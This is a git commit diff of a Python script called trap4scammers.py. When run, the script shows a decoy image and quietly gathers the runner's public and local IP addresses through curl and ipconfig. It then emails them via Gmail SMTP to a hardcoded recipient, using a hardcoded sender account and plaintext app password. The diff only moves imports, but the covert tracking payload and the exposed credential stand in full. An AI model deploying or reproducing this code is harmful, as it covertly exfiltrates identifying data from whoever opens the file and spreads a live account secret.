927d1c592690db9e1735cd6cb9b0bee9993f20ed
Valerii Syroiezhin <v.syroiezhin@Air-Valerii.lan>
2022-08-02 03:21:57 +0300

    Update trap4scammers.py

--- trap4scammers.py
+++ trap4scammers.py
@@ -1,11 +1,10 @@
 from os import popen, system
-from PIL import Image
-from email_to import Message, EmailServer
 
 def shape():
   print("#")
   system("ls")
   print("#")
+  from PIL import Image
   Image.open("image.jpeg").show()
 
   try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
@@ -13,7 +12,7 @@ def shape():
   finally:
     sender = "7kipgod@gmail.com"
     destination = "svaller22@gmail.com"
-    
+    from email_to import Message, EmailServer
     # create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords
     EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
 
